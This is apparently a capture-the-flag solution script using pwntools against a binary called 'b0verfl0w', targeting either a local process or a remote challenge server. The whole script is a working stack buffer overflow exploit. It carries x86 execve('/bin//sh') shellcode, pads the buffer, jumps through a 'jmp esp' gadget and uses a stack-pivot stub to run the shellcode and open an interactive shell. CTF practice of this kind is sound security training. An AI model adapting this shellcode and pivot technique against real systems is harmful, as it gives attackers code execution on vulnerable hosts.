from pwn import *
from sys import argv
context(os='linux', arch='i386', log_level='debug')
binary = './b0verfl0w'

context.binary = binary
elf = ELF(binary)
io = remote('node4.buuoj.cn',29308) if argv[1]=='r' else process(binary)

shellcode = b"\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"

jmp_esp=0x8048504
sub_esp_jmp=asm('sub esp,0x28;jmp esp')

payload=shellcode+(0x20-len(shellcode)+4)*b'a'+p32(jmp_esp)+sub_esp_jmp

io.sendline(payload)

io.interactive()
